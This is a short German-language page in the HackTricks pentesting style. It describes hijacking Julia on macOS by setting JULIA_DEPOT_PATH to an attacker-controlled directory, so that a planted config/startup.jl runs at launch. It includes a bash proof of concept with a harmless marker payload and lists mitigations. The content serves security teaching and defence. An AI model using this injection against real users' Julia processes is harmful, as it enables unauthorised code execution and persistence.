# macOS Julia-Anwendungen Injection

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` und `startup.jl`

Julia führt beim Start normalerweise `config/startup.jl` aus ihrem ersten Depot aus. `JULIA_DEPOT_PATH` steuert die Depot-Liste. Wird die Variable auf einen für Angreifer lesbaren Verzeichnisbaum gesetzt, wird die automatisch geladene Startup-Datei umgeleitet.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
Das abschließende Trennzeichen ist nützlich, wenn das Opfer weiterhin seine normalen Pakete benötigt. `julia --startup-file=no` deaktiviert diese Startdatei. Lösche die Variable vor dem Start, da sie außerdem Paketregistries, Umgebungen, Caches und Speicherorte für das Laden von Code steuert.

## References

- [1] [Julia-Kommandozeilenschnittstelle: Startdatei](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Julia-Umgebungsvariablen: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
